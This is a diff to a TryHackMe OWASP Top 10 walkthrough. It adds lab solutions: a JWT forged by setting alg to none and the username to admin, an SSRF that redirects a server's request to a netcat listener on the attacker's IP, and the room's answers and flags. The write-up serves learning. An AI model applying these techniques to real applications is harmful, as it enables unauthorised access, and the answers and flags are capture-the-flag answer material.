@@ -215,25 +215,59 @@ Answer:fe86079416a21a3c99937fea8874b667,d9ac0f7db4fda460ac3edeb75d75e16e
 
 18.Software and Data Integrity Failures
 
-https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b93dd140259193ee75ae1d12562bbd29.png
+We can check hashes of programs with md5sum,sha1sum,sha256sum and so on to know if the file got modified while it was transmitted.
+Here the example is WinSCP-5.21.5-Setup.exe on the sourceforge website you can see the md5 checksum as example.
 
 19.Software Integrity Failures
 
+Enter this on the website and change it to sha256, https://code.jquery.com/jquery-1.12.4.min.js
+https://www.srihash.org/
 
+Then you get the sha256 and you can copy it to the answer.
+
+Answer:sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
 
 20.Data Integrity Failures
 
+Login as guest with password guest.
 
+Then press F12 and look under Storage and then Cookies.The first answer is jwt-session.Copy the value you see under the link
+https://appdevtools.com/base64-encoder-decoder
+
+Remove the last signature part .xxxxxxxxx and then you gonna see the decoded stuff open a second site with the base64 
+decoder/encoder and modify the alg value to none and the username to admin and encode it.
+Encode it seperatly and add . between them and leave the signature out.
+
+{"typ":"JWT","alg":"none"}
+{"username":"admin","exp":xxxxxxxxxxxxxxx}
+
+Answers:jwt-session,THM{Dont_take_cookies_from_strangers}
 
 21.Security Logging and Monitoring Failures
 
+Read the log file that u should download.
 
+The ip is in the log and brute force i guessed because he is going through the common names of a system.
+
+Answers:49.99.13.16,brute force
 
 22.Server-Side Request Forgery (SSRF)
 
+Look into the website http://machine_ip:8087 top right corner then admin area.
 
+Hover over the Download Resumee button and read the link.
+
+prepare a listner with 8087
+nc -lvp 8087
+
+In the browser we use this link with our ip (in this case the openvpn ip)
+http://10.10.216.175:8087/download?server=your_ip:8087&id=75482342
+
+Answers:localhost,secure-file-storage.com,THM{Hello_Im_just_an_API_key}
+
+I skipped the additional flag since i have no idea what to do.Missing knowledge.
 
 23.Whats Next?
 
-
+Continue the paths.
 
